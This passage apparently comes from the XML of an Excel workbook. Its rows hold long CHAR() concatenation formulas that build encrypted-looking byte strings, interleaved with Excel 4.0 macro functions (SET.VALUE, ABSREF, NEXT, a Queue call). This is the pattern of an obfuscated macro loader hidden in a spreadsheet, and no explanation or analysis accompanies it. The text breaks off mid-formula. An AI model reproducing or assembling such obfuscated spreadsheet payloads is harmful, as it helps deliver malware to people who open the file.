&amp;CHAR(148)&amp;CHAR(1)&amp;CHAR(50)&amp;CHAR(145)&amp;CHAR(204)&amp;CHAR(200)&amp;CHAR(69)&amp;CHAR(168)&amp;CHAR(249)&amp;CHAR(9)&amp;CHAR(65)&amp;CHAR(197)&amp;CHAR(57)&amp;CHAR(45)&amp;CHAR(203)&amp;CHAR(50)&amp;CHAR(188)&amp;CHAR(111)&amp;CHAR(203)&amp;CHAR(60)&amp;CHAR(191)&amp;CHAR(57)&amp;CHAR(3)&amp;CHAR(152)&amp;CHAR(235)&amp;CHAR(102)&amp;CHAR(74)&amp;CHAR(75)&amp;CHAR(163)&amp;CHAR(44)&amp;CHAR(85)&amp;CHAR(44)&amp;CHAR(254)&amp;CHAR(166)&amp;CHAR(215)&amp;CHAR(49)&amp;CHAR(176)&amp;CHAR(231)&amp;CHAR(172)&amp;CHAR(92)&amp;CHAR(80)&amp;CHAR(128)&amp;CHAR(24)&amp;CHAR(22)&amp;CHAR(1)&amp;CHAR(185)&amp;CHAR(151)&amp;CHAR(101)&amp;CHAR(68)&amp;CHAR(140)&amp;CHAR(149)&amp;CHAR(48)&amp;CHAR(165)&amp;CHAR(63)&amp;CHAR(90)&amp;CHAR(86)&amp;CHAR(46)&amp;CHAR(13)&amp;CHAR(184)&amp;CHAR(121)&amp;CHAR(236)&amp;CHAR(25)&amp;CHAR(2)&amp;CHAR(103)&amp;CHAR(34)&amp;CHAR(38)&amp;CHAR(95)&amp;CHAR(242)&amp;CHAR(102)&amp;CHAR(199)&amp;CHAR(149)&amp;CHAR(68)&amp;CHAR(161)&amp;CHAR(139)&amp;CHAR(247)&amp;CHAR(153)&amp;CHAR(224)&amp;CHAR(87)&amp;CHAR(144)&amp;CHAR(73)&amp;CHAR(155)&amp;CHAR(193)&amp;CHAR(230)&amp;CHAR(46)&amp;CHAR(24)&amp;CHAR(86)&amp;CHAR(39)&amp;CHAR(81)&amp;CHAR(169)&amp;CHAR(133)&amp;CHAR(84)&amp;CHAR(9)&amp;CHAR(136)&amp;CHAR(143)&amp;CHAR(91)&amp;CHAR(234)&amp;CHAR(115)&amp;CHAR(222)&amp;CHAR(246)&amp;CHAR(63)&amp;CHAR(128)&amp;CHAR(191)&amp;CHAR(162)&amp;CHAR(80)&amp;CHAR(139)&amp;CHAR(93)&amp;CHAR(69)&amp;CHAR(209)&amp;CHAR(136)&amp;CHAR(84)&amp;CHAR(223)&amp;CHAR(173)&amp;CHAR(62)&amp;CHAR(66)&amp;CHAR(57)&amp;CHAR(189)&amp;CHAR(105)&amp;CHAR(140)&amp;CHAR(23)&amp;CHAR(216)&amp;CHAR(255)&amp;CHAR(233)&amp;CHAR(242)&amp;CHAR(237)</f>
        <v>Ï¸J«\È9OèÙÏp=Uc½‚ÏâU_x001C__x0010_._x0015_ßv&amp;BBN±Å,ì*\néTŸæ_x0019_–û9¸†E°XŽ_x0007_ÓóQ	`Â€;¡ÌÇ]—ôÝt˜_x001A_’_x0011_âî_x0006_¾¸ºœH0Ñ€_x0004_T_x000C_ª¤_x0006_5_x0018_RJˆ³©Yþqç”_x001B_Ôoù¦ø?I–ÓJUQÅ4Þ×#_x0003_eAò”_x0001_2‘ÌÈE¨ù	AÅ9-Ë2¼oË&lt;¿9_x0003_˜ëfJK£,U,þ¦×1°ç¬\P€_x0018__x0016__x0001_¹—eDŒ•0¥?ZV._x000D_¸yì_x0019__x0002_g"&amp;_òfÇ•D¡‹÷™àWI›Áæ._x0018_V'Q©…T	ˆ[êsÞö?€¿¢P‹]EÑˆTß­&gt;B9½iŒ_x0017_Øÿéòí</v>
      </c>
      <c r="C34" t="str">
        <f>CHAR(15)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(223)&amp;CHAR(210)&amp;CHAR(213)</f>
        <v>_x000F_þô6¨£0ßÒÕ</v>
      </c>
    </row>
    <row r="35" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A35" t="b">
        <f>SET.VALUE(#REF!,#REF!+1)</f>
        <v>0</v>
      </c>
      <c r="B35" t="str">
        <f>CHAR(1)&amp;CHAR(168)&amp;CHAR(220)&amp;CHAR(163)&amp;CHAR(77)&amp;CHAR(244)&amp;CHAR(53)&amp;CHAR(156)&amp;CHAR(99)&amp;CHAR(78)&amp;CHAR(88)&amp;CHAR(145)&amp;CHAR(93)&amp;CHAR(70)&amp;CHAR(43)&amp;CHAR(132)&amp;CHAR(204)&amp;CHAR(43)&amp;CHAR(173)&amp;CHAR(127)&amp;CHAR(178)&amp;CHAR(17)&amp;CHAR(161)&amp;CHAR(138)&amp;CHAR(235)&amp;CHAR(78)&amp;CHAR(10)&amp;CHAR(38)&amp;CHAR(86)&amp;CHAR(29)&amp;CHAR(121)&amp;CHAR(232)&amp;CHAR(3)&amp;CHAR(21)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(22)&amp;CHAR(177)&amp;CHAR(100)&amp;CHAR(100)&amp;CHAR(11)&amp;CHAR(32)&amp;CHAR(65)&amp;CHAR(72)&amp;CHAR(30)&amp;CHAR(64)&amp;CHAR(106)&amp;CHAR(163)&amp;CHAR(161)&amp;CHAR(104)&amp;CHAR(190)&amp;CHAR(87)&amp;CHAR(86)&amp;CHAR(59)&amp;CHAR(144)&amp;CHAR(68)&amp;CHAR(89)&amp;CHAR(158)&amp;CHAR(83)&amp;CHAR(43)&amp;CHAR(71)&amp;CHAR(10)&amp;CHAR(157)&amp;CHAR(192)&amp;CHAR(120)&amp;CHAR(243)&amp;CHAR(81)&amp;CHAR(234)&amp;CHAR(195)&amp;CHAR(101)&amp;CHAR(103)&amp;CHAR(253)&amp;CHAR(91)&amp;CHAR(129)&amp;CHAR(148)&amp;CHAR(178)&amp;CHAR(176)&amp;CHAR(130)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(123)&amp;CHAR(238)&amp;CHAR(238)&amp;CHAR(225)&amp;CHAR(35)&amp;CHAR(220)&amp;CHAR(114)&amp;CHAR(105)&amp;CHAR(161)&amp;CHAR(156)&amp;CHAR(79)&amp;CHAR(72)&amp;CHAR(228)&amp;CHAR(126)&amp;CHAR(218)&amp;CHAR(88)&amp;CHAR(137)&amp;CHAR(98)&amp;CHAR(90)&amp;CHAR(91)&amp;CHAR(204)&amp;CHAR(27)&amp;CHAR(77)&amp;CHAR(39)&amp;CHAR(91)&amp;CHAR(49)&amp;CHAR(175)&amp;CHAR(62)&amp;CHAR(196)&amp;CHAR(43)&amp;CHAR(238)&amp;CHAR(48)&amp;CHAR(97)&amp;CHAR(219)&amp;CHAR(16)&amp;CHAR(47)&amp;CHAR(128)&amp;CHAR(173)&amp;CHAR(222)&amp;CHAR(47)&amp;CHAR(126)&amp;CHAR(28)&amp;CHAR(54)&amp;CHAR(239)&amp;CHAR(243)&amp;CHAR(105)&amp;CHAR(60)&amp;CHAR(228)&amp;CHAR(243)&amp;CHAR(120)&amp;CHAR(203)&amp;CHAR(100)&amp;CHAR(164)&amp;CHAR(64)&amp;CHAR(243)&amp;CHAR(237)&amp;CHAR(35)&amp;CHAR(141)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(141)&amp;CHAR(28)&amp;CHAR(94)&amp;CHAR(226)&amp;CHAR(22)&amp;CHAR(75)&amp;CHAR(73)&amp;CHAR(130)&amp;CHAR(109)&amp;CHAR(175)&amp;CHAR(231)&amp;CHAR(91)&amp;CHAR(163)&amp;CHAR(85)&amp;CHAR(16)&amp;CHAR(190)&amp;CHAR(158)&amp;CHAR(121)&amp;CHAR(74)&amp;CHAR(203)&amp;CHAR(252)&amp;CHAR(2)&amp;CHAR(228)&amp;CHAR(253)&amp;CHAR(186)&amp;CHAR(201)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(168)&amp;CHAR(94)&amp;CHAR(124)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(38)&amp;CHAR(161)&amp;CHAR(29)&amp;CHAR(215)&amp;CHAR(225)&amp;CHAR(88)&amp;CHAR(59)&amp;CHAR(79)&amp;CHAR(95)&amp;CHAR(42)&amp;CHAR(39)&amp;CHAR(31)&amp;CHAR(38)&amp;CHAR(243)&amp;CHAR(10)&amp;CHAR(48)&amp;CHAR(221)&amp;CHAR(215)&amp;CHAR(92)&amp;CHAR(207)&amp;CHAR(89)&amp;CHAR(186)&amp;CHAR(187)&amp;CHAR(207)&amp;CHAR(139)&amp;CHAR(58)&amp;CHAR(178)&amp;CHAR(142)&amp;CHAR(87)&amp;CHAR(27)&amp;CHAR(211)&amp;CHAR(9)&amp;CHAR(20)&amp;CHAR(161)&amp;CHAR(62)&amp;CHAR(185)&amp;CHAR(102)&amp;CHAR(62)&amp;CHAR(139)&amp;CHAR(178)&amp;CHAR(71)&amp;CHAR(18)&amp;CHAR(143)&amp;CHAR(138)&amp;CHAR(161)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(172)&amp;CHAR(170)&amp;CHAR(99)&amp;CHAR(68)&amp;CHAR(175)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(201)&amp;CHAR(3)&amp;CHAR(70)&amp;CHAR(189)&amp;CHAR(123)&amp;CHAR(253)&amp;CHAR(17)&amp;CHAR(31)&amp;CHAR(19)&amp;CHAR(245)&amp;CHAR(26)&amp;CHAR(136)&amp;CHAR(28)&amp;CHAR(140)&amp;CHAR(10)&amp;CHAR(229)&amp;CHAR(178)&amp;CHAR(161)&amp;CHAR(147)&amp;CHAR(245)&amp;CHAR(177)&amp;CHAR(143)&amp;CHAR(204)&amp;CHAR(113)&amp;CHAR(136)&amp;CHAR(98)</f>
        <v>_x0001_¨Ü£Mô5œcNX‘]F+„Ì+­²_x0011_¡ŠëN
&amp;V_x001D_yè_x0003__x0015_ŒK_x0016_±dd_x000B_ AH_x001E_@j£¡h¾WV;DYžS+G
ÀxóQêÃegý[”²°‚VV{îîá#Üri¡œOHä~ÚX‰bZ[Ì_x001B_M'[1¯&gt;Ä+î0aÛ_x0010_/€­Þ/~_x001C_6ïói&lt;äóxËd¤@óí#_x001D_r_x001C_^â_x0016_KI‚m¯ç[£U_x0010_¾žyJËü_x0002_äýºÉV!†Å¨^|€_x0003_&amp;¡_x001D_×áX;O_*'_x001F_&amp;ó
0Ý×\ÏYº»Ï‹:²ŽW_x001B_Ó	_x0014_¡&gt;¹f&gt;‹²G_x0012_Š¡_x000E__x0006_¬ªcD¯_x001D_	É_x0003_F½{ý_x0011__x001F__x0013_õ_x001A_ˆ_x001C_Œ
å²¡“õ±Ìqˆb</v>
      </c>
      <c r="C35" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(56)&amp;CHAR(45)&amp;CHAR(183)&amp;CHAR(180)&amp;CHAR(125)&amp;CHAR(198)</f>
        <v>ô6Í£8-·´}Æ</v>
      </c>
    </row>
    <row r="36" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A36" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>0</v>
      </c>
      <c r="B36" t="str">
        <f>CHAR(94)&amp;CHAR(161)&amp;CHAR(126)&amp;CHAR(110)&amp;CHAR(201)&amp;CHAR(155)&amp;CHAR(92)&amp;CHAR(204)&amp;CHAR(150)&amp;CHAR(50)&amp;CHAR(65)&amp;CHAR(144)&amp;CHAR(18)&amp;CHAR(167)&amp;CHAR(163)&amp;CHAR(252)&amp;CHAR(111)&amp;CHAR(16)&amp;CHAR(73)&amp;CHAR(92)&amp;CHAR(254)&amp;CHAR(237)&amp;CHAR(23)&amp;CHAR(140)&amp;CHAR(133)&amp;CHAR(33)&amp;CHAR(232)&amp;CHAR(24)&amp;CHAR(216)&amp;CHAR(42)&amp;CHAR(178)&amp;CHAR(245)&amp;CHAR(3)&amp;CHAR(222)&amp;CHAR(234)&amp;CHAR(242)&amp;CHAR(46)&amp;CHAR(81)&amp;CHAR(19)&amp;CHAR(176)&amp;CHAR(219)&amp;CHAR(177)&amp;CHAR(221)&amp;CHAR(221)&amp;CHAR(135)&amp;CHAR(139)&amp;CHAR(72)&amp;CHAR(23)&amp;CHAR(98)&amp;CHAR(3)&amp;CHAR(165)&amp;CHAR(150)&amp;CHAR(87)&amp;CHAR(231)&amp;CHAR(170)&amp;CHAR(158)&amp;CHAR(195)&amp;CHAR(148)&amp;CHAR(228)&amp;CHAR(212)&amp;CHAR(35)&amp;CHAR(195)&amp;CHAR(144)&amp;CHAR(174)&amp;CHAR(106)&amp;CHAR(38)&amp;CHAR(142)&amp;CHAR(132)&amp;CHAR(101)&amp;CHAR(186)&amp;CHAR(146)&amp;CHAR(1)&amp;CHAR(83)&amp;CHAR(253)&amp;CHAR(116)&amp;CHAR(70)&amp;CHAR(192)&amp;CHAR(146)&amp;CHAR(97)&amp;CHAR(22)&amp;CHAR(206)&amp;CHAR(79)&amp;CHAR(147)&amp;CHAR(251)&amp;CHAR(100)&amp;CHAR(206)&amp;CHAR(190)&amp;CHAR(2)&amp;CHAR(118)&amp;CHAR(130)&amp;CHAR(235)&amp;CHAR(67)&amp;CHAR(129)&amp;CHAR(143)&amp;CHAR(101)&amp;CHAR(181)&amp;CHAR(170)&amp;CHAR(29)&amp;CHAR(177)&amp;CHAR(59)&amp;CHAR(51)&amp;CHAR(110)&amp;CHAR(218)&amp;CHAR(97)&amp;CHAR(120)&amp;CHAR(253)&amp;CHAR(222)&amp;CHAR(14)&amp;CHAR(253)&amp;CHAR(42)&amp;CHAR(184)&amp;CHAR(195)&amp;CHAR(200)&amp;CHAR(228)&amp;CHAR(7)&amp;CHAR(56)&amp;CHAR(59)&amp;CHAR(94)&amp;CHAR(168)&amp;CHAR(136)&amp;CHAR(244)&amp;CHAR(154)&amp;CHAR(181)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(39)&amp;CHAR(179)&amp;CHAR(69)&amp;CHAR(219)&amp;CHAR(114)&amp;CHAR(1)&amp;CHAR(62)&amp;CHAR(108)&amp;CHAR(4)&amp;CHAR(114)&amp;CHAR(238)&amp;CHAR(202)&amp;CHAR(20)&amp;CHAR(242)&amp;CHAR(164)&amp;CHAR(69)&amp;CHAR(90)&amp;CHAR(34)&amp;CHAR(159)&amp;CHAR(158)&amp;CHAR(104)&amp;CHAR(24)&amp;CHAR(229)&amp;CHAR(123)&amp;CHAR(173)&amp;CHAR(236)&amp;CHAR(231)&amp;CHAR(9)&amp;CHAR(49)&amp;CHAR(213)&amp;CHAR(31)&amp;CHAR(123)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(201)&amp;CHAR(76)&amp;CHAR(75)&amp;CHAR(41)&amp;CHAR(15)&amp;CHAR(230)&amp;CHAR(223)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(171)&amp;CHAR(7)&amp;CHAR(21)&amp;CHAR(30)&amp;CHAR(37)&amp;CHAR(209)&amp;CHAR(50)&amp;CHAR(88)&amp;CHAR(207)&amp;CHAR(116)&amp;CHAR(120)&amp;CHAR(103)&amp;CHAR(34)&amp;CHAR(204)&amp;CHAR(174)&amp;CHAR(200)&amp;CHAR(57)&amp;CHAR(29)&amp;CHAR(48)&amp;CHAR(217)&amp;CHAR(136)&amp;CHAR(84)&amp;CHAR(156)&amp;CHAR(147)&amp;CHAR(213)&amp;CHAR(38)&amp;CHAR(50)&amp;CHAR(197)&amp;CHAR(158)&amp;CHAR(93)&amp;CHAR(255)&amp;CHAR(20)&amp;CHAR(143)&amp;CHAR(139)&amp;CHAR(137)&amp;CHAR(136)&amp;CHAR(8)&amp;CHAR(28)&amp;CHAR(239)&amp;CHAR(134)&amp;CHAR(35)&amp;CHAR(244)&amp;CHAR(181)&amp;CHAR(28)&amp;CHAR(78)&amp;CHAR(56)&amp;CHAR(53)&amp;CHAR(42)&amp;CHAR(50)&amp;CHAR(186)&amp;CHAR(178)&amp;CHAR(71)&amp;CHAR(90)&amp;CHAR(65)&amp;CHAR(104)&amp;CHAR(186)&amp;CHAR(59)&amp;CHAR(210)&amp;CHAR(92)&amp;CHAR(119)&amp;CHAR(112)&amp;CHAR(103)&amp;CHAR(249)&amp;CHAR(180)&amp;CHAR(55)&amp;CHAR(58)&amp;CHAR(122)&amp;CHAR(18)&amp;CHAR(103)&amp;CHAR(236)&amp;CHAR(89)&amp;CHAR(99)&amp;CHAR(63)&amp;CHAR(125)&amp;CHAR(103)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(24)&amp;CHAR(10)&amp;CHAR(170)&amp;CHAR(216)&amp;CHAR(196)&amp;CHAR(52)&amp;CHAR(253)&amp;CHAR(194)&amp;CHAR(12)&amp;CHAR(83)</f>
        <v>^¡~nÉ›\Ì–2A_x0012_§£üo_x0010_I\þí_x0017_Œ…!è_x0018_Ø*²õ_x0003_Þêò.Q_x0013_°Û±ÝÝ‡‹H_x0017_b_x0003_¥–WçªžÃ”äÔ#Ã®j&amp;Ž„eº’_x0001_SýtFÀ’a_x0016_ÎO“ûdÎ¾_x0002_v‚ëCeµª_x001D_±;3nÚaxýÞ_x000E_ý*¸ÃÈä_x0007_8;^¨ˆôšµÏ!'³EÛr_x0001_&gt;l_x0004_rîÊ_x0014_ò¤EZ"Ÿžh_x0018_å{­ìç	1Õ_x001F_{ŒÈÉLK)_x000F_æß_x000E_U«_x0007__x0015__x001E_%Ñ2XÏtxg"Ì®È9_x001D_0ÙˆTœ“Õ&amp;2Åž]ÿ_x0014_‹‰ˆ_x0008__x001C_ï†#ôµ_x001C_N85*2º²GZAhº;Ò\wpgù´7:z_x0012_gìYc?}gì»_x0018_
ªØÄ4ýÂ_x000C_S</v>
      </c>
      <c r="C36" t="str">
        <f>CHAR(133)&amp;CHAR(102)&amp;CHAR(174)&amp;CHAR(141)&amp;CHAR(241)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(64)&amp;CHAR(230)</f>
        <v>…f®ñýô~@æ</v>
      </c>
    </row>
    <row r="37" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A37" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B37" t="str">
        <f>CHAR(35)&amp;CHAR(242)&amp;CHAR(51)&amp;CHAR(195)&amp;CHAR(106)&amp;CHAR(78)&amp;CHAR(226)&amp;CHAR(54)&amp;CHAR(40)&amp;CHAR(71)&amp;CHAR(160)&amp;CHAR(84)&amp;CHAR(16)&amp;CHAR(181)&amp;CHAR(80)&amp;CHAR(103)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(17)&amp;CHAR(244)&amp;CHAR(64)&amp;CHAR(224)&amp;CHAR(242)&amp;CHAR(89)&amp;CHAR(103)&amp;CHAR(137)&amp;CHAR(58)&amp;CHAR(42)&amp;CHAR(96)&amp;CHAR(214)&amp;CHAR(113)&amp;CHAR(6)&amp;CHAR(173)&amp;CHAR(221)&amp;CHAR(233)&amp;CHAR(130)&amp;CHAR(90)&amp;CHAR(61)&amp;CHAR(160)&amp;CHAR(54)&amp;CHAR(173)&amp;CHAR(51)&amp;CHAR(249)&amp;CHAR(135)&amp;CHAR(90)&amp;CHAR(238)&amp;CHAR(18)&amp;CHAR(13)&amp;CHAR(153)&amp;CHAR(25)&amp;CHAR(191)&amp;CHAR(4)&amp;CHAR(225)&amp;CHAR(71)&amp;CHAR(71)&amp;CHAR(36)&amp;CHAR(76)&amp;CHAR(221)&amp;CHAR(153)&amp;CHAR(206)&amp;CHAR(60)&amp;CHAR(226)&amp;CHAR(43)&amp;CHAR(119)&amp;CHAR(205)&amp;CHAR(22)&amp;CHAR(253)&amp;CHAR(5)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(94)&amp;CHAR(89)&amp;CHAR(198)&amp;CHAR(122)&amp;CHAR(255)&amp;CHAR(228)&amp;CHAR(114)&amp;CHAR(164)&amp;CHAR(173)&amp;CHAR(41)&amp;CHAR(68)&amp;CHAR(91)&amp;CHAR(124)&amp;CHAR(142)&amp;CHAR(103)&amp;CHAR(25)&amp;CHAR(191)&amp;CHAR(32)&amp;CHAR(76)&amp;CHAR(81)&amp;CHAR(173)&amp;CHAR(247)&amp;CHAR(140)&amp;CHAR(196)&amp;CHAR(127)&amp;CHAR(99)&amp;CHAR(132)&amp;CHAR(145)&amp;CHAR(136)&amp;CHAR(80)&amp;CHAR(112)&amp;CHAR(79)&amp;CHAR(193)&amp;CHAR(13)&amp;CHAR(229)&amp;CHAR(94)&amp;CHAR(204)&amp;CHAR(46)&amp;CHAR(206)&amp;CHAR(194)&amp;CHAR(80)&amp;CHAR(102)&amp;CHAR(172)&amp;CHAR(135)&amp;CHAR(44)&amp;CHAR(26)&amp;CHAR(185)&amp;CHAR(31)&amp;CHAR(191)&amp;CHAR(253)&amp;CHAR(5)&amp;CHAR(250)&amp;CHAR(132)&amp;CHAR(129)&amp;CHAR(223)&amp;CHAR(204)&amp;CHAR(11)&amp;CHAR(73)&amp;CHAR(205)&amp;CHAR(88)&amp;CHAR(238)&amp;CHAR(225)&amp;CHAR(113)&amp;CHAR(225)&amp;CHAR(200)&amp;CHAR(230)&amp;CHAR(131)&amp;CHAR(178)&amp;CHAR(121)&amp;CHAR(58)&amp;CHAR(86)&amp;CHAR(34)&amp;CHAR(214)&amp;CHAR(140)&amp;CHAR(13)&amp;CHAR(114)&amp;CHAR(69)&amp;CHAR(188)&amp;CHAR(139)&amp;CHAR(137)&amp;CHAR(86)&amp;CHAR(179)&amp;CHAR(183)&amp;CHAR(120)&amp;CHAR(88)&amp;CHAR(115)&amp;CHAR(179)&amp;CHAR(251)&amp;CHAR(157)&amp;CHAR(194)&amp;CHAR(185)&amp;CHAR(49)&amp;CHAR(121)&amp;CHAR(185)&amp;CHAR(25)&amp;CHAR(236)&amp;CHAR(94)&amp;CHAR(131)&amp;CHAR(164)&amp;CHAR(12)&amp;CHAR(202)&amp;CHAR(211)&amp;CHAR(77)&amp;CHAR(183)&amp;CHAR(190)&amp;CHAR(44)&amp;CHAR(9)&amp;CHAR(22)&amp;CHAR(38)&amp;CHAR(239)&amp;CHAR(26)&amp;CHAR(41)&amp;CHAR(250)&amp;CHAR(206)&amp;CHAR(117)&amp;CHAR(115)&amp;CHAR(210)&amp;CHAR(170)&amp;CHAR(22)&amp;CHAR(136)&amp;CHAR(216)&amp;CHAR(23)&amp;CHAR(132)&amp;CHAR(166)&amp;CHAR(171)&amp;CHAR(218)&amp;CHAR(234)&amp;CHAR(225)&amp;CHAR(130)&amp;CHAR(158)&amp;CHAR(235)&amp;CHAR(159)&amp;CHAR(155)&amp;CHAR(215)&amp;CHAR(113)&amp;CHAR(235)&amp;CHAR(34)&amp;CHAR(166)&amp;CHAR(67)&amp;CHAR(48)&amp;CHAR(252)&amp;CHAR(238)&amp;CHAR(6)&amp;CHAR(210)&amp;CHAR(58)&amp;CHAR(114)&amp;CHAR(141)&amp;CHAR(126)&amp;CHAR(240)&amp;CHAR(150)&amp;CHAR(240)&amp;CHAR(229)&amp;CHAR(75)&amp;CHAR(9)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(129)&amp;CHAR(37)&amp;CHAR(86)&amp;CHAR(31)&amp;CHAR(104)&amp;CHAR(153)&amp;CHAR(167)&amp;CHAR(156)&amp;CHAR(21)&amp;CHAR(91)&amp;CHAR(132)&amp;CHAR(203)&amp;CHAR(152)&amp;CHAR(120)&amp;CHAR(46)&amp;CHAR(224)&amp;CHAR(124)&amp;CHAR(132)&amp;CHAR(159)&amp;CHAR(142)&amp;CHAR(171)&amp;CHAR(251)&amp;CHAR(153)&amp;CHAR(115)&amp;CHAR(5)&amp;CHAR(209)&amp;CHAR(5)&amp;CHAR(97)&amp;CHAR(237)</f>
        <v>#ò3ÃjNâ6(G T_x0010_µPg_x0003_þ_x0011_ô@àòYg‰:*`Öq_x0006_­Ýé‚Z= 6­3ù‡Zî_x0012__x000D_™_x0019_¿_x0004_áGG$LÝ™Î&lt;â+wÍ_x0016_ý_x0005_×†^YÆzÿär¤­)D[|Žg_x0019_¿ LQ­÷ŒÄc„‘ˆPpOÁ_x000D_å^Ì.ÎÂPf¬‡,_x001A_¹_x001F_¿ý_x0005_ú„ßÌ_x000B_IÍXîáqáÈæƒ²y:V"ÖŒ_x000D_rE¼‹‰V³·xXs³ûÂ¹1y¹_x0019_ì^ƒ¤_x000C_ÊÓM·¾,	_x0016_&amp;ï_x001A_)úÎusÒª_x0016_ˆØ_x0017_„¦«Úêá‚žëŸ›×që"¦C0üî_x0006_Ò:r~ð–ðåK	õ{%V_x001F_h™§œ_x0015_[„Ë˜x.à|„ŸŽ«û™s_x0005_Ñ_x0005_aí</v>
      </c>
      <c r="C37" t="str">
        <f>CHAR(163)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(28)&amp;CHAR(227)&amp;CHAR(206)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(142)</f>
        <v>£í÷ý_x001C_ãÎë»Ž</v>
      </c>
    </row>
    <row r="38" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A38" t="e">
        <f>Queue(A21,-2,0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B38" t="str">
        <f>CHAR(192)&amp;CHAR(179)&amp;CHAR(8)&amp;CHAR(61)&amp;CHAR(154)&amp;CHAR(50)&amp;CHAR(222)&amp;CHAR(208)&amp;CHAR(194)&amp;CHAR(98)&amp;CHAR(97)&amp;CHAR(156)&amp;CHAR(150)&amp;CHAR(201)&amp;CHAR(122)&amp;CHAR(255)&amp;CHAR(176)&amp;CHAR(221)&amp;CHAR(126)&amp;CHAR(126)&amp;CHAR(107)&amp;CHAR(128)&amp;CHAR(68)&amp;CHAR(112)&amp;CHAR(156)&amp;CHAR(236)&amp;CHAR(120)&amp;CHAR(109)&amp;CHAR(128)&amp;CHAR(247)&amp;CHAR(221)&amp;CHAR(176)&amp;CHAR(110)&amp;CHAR(120)&amp;CHAR(32)&amp;CHAR(74)&amp;CHAR(109)&amp;CHAR(198)&amp;CHAR(116)&amp;CHAR(163)&amp;CHAR(199)&amp;CHAR(103)&amp;CHAR(31)&amp;CHAR(239)&amp;CHAR(252)&amp;CHAR(48)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(30)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(22)&amp;CHAR(228)&amp;CHAR(32)&amp;CHAR(193)&amp;CHAR(132)&amp;CHAR(13)&amp;CHAR(124)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(41)&amp;CHAR(60)&amp;CHAR(158)&amp;CHAR(209)&amp;CHAR(211)&amp;CHAR(169)&amp;CHAR(142)&amp;CHAR(50)&amp;CHAR(214)&amp;CHAR(119)&amp;CHAR(18)&amp;CHAR(124)&amp;CHAR(200)&amp;CHAR(246)&amp;CHAR(105)&amp;CHAR(53)&amp;CHAR(107)&amp;CHAR(130)&amp;CHAR(132)&amp;CHAR(192)&amp;CHAR(177)&amp;CHAR(14)&amp;CHAR(204)&amp;CHAR(169)&amp;CHAR(21)&amp;CHAR(114)&amp;CHAR(8)&amp;CHAR(240)&amp;CHAR(176)&amp;CHAR(226)&amp;CHAR(191)&amp;CHAR(101)&amp;CHAR(29)&amp;CHAR(52)&amp;CHAR(157)&amp;CHAR(27)&amp;CHAR(65)&amp;CHAR(59)&amp;CHAR(55)&amp;CHAR(20)&amp;CHAR(154)&amp;CHAR(42)&amp;CHAR(60)&amp;CHAR(247)&amp;CHAR(223)&amp;CHAR(71)&amp;CHAR(30)&amp;CHAR(169)&amp;CHAR(197)&amp;CHAR(142)&amp;CHAR(128)&amp;CHAR(41)&amp;CHAR(47)&amp;CHAR(59)&amp;CHAR(236)&amp;CHAR(21)&amp;CHAR(22)&amp;CHAR(158)&amp;CHAR(178)&amp;CHAR(182)&amp;CHAR(148)&amp;CHAR(214)&amp;CHAR(34)&amp;CHAR(251)&amp;CHAR(182)&amp;CHAR(133)&amp;CHAR(72)&amp;CHAR(241)&amp;CHAR(169)&amp;CHAR(143)&amp;CHAR(96)&amp;CHAR(40)&amp;CHAR(103)&amp;CHAR(212)&amp;CHAR(220)&amp;CHAR(142)&amp;CHAR(91)&amp;CHAR(117)&amp;CHAR(126)&amp;CHAR(98)&amp;CHAR(94)&amp;CHAR(36)&amp;CHAR(247)&amp;CHAR(117)&amp;CHAR(34)&amp;CHAR(156)&amp;CHAR(2)&amp;CHAR(29)&amp;CHAR(196)&amp;CHAR(76)&amp;CHAR(92)&amp;CHAR(214)&amp;CHAR(240)&amp;CHAR(98)&amp;CHAR(183)&amp;CHAR(63)&amp;CHAR(206)&amp;CHAR(243)&amp;CHAR(19)&amp;CHAR(220)&amp;CHAR(172)&amp;CHAR(51)&amp;CHAR(180)&amp;CHAR(30)&amp;CHAR(3)&amp;CHAR(209)&amp;CHAR(167)&amp;CHAR(218)&amp;CHAR(93)&amp;CHAR(5)&amp;CHAR(237)&amp;CHAR(67)&amp;CHAR(152)&amp;CHAR(138)&amp;CHAR(166)&amp;CHAR(200)&amp;CHAR(172)&amp;CHAR(140)&amp;CHAR(46)&amp;CHAR(56)&amp;CHAR(2)&amp;CHAR(40)&amp;CHAR(145)&amp;CHAR(149)&amp;CHAR(102)&amp;CHAR(81)&amp;CHAR(247)&amp;CHAR(97)&amp;CHAR(72)&amp;CHAR(109)&amp;CHAR(252)&amp;CHAR(236)&amp;CHAR(253)&amp;CHAR(37)&amp;CHAR(158)&amp;CHAR(244)&amp;CHAR(6)&amp;CHAR(19)&amp;CHAR(140)&amp;CHAR(129)&amp;CHAR(195)&amp;CHAR(81)&amp;CHAR(109)&amp;CHAR(65)&amp;CHAR(192)&amp;CHAR(254)&amp;CHAR(10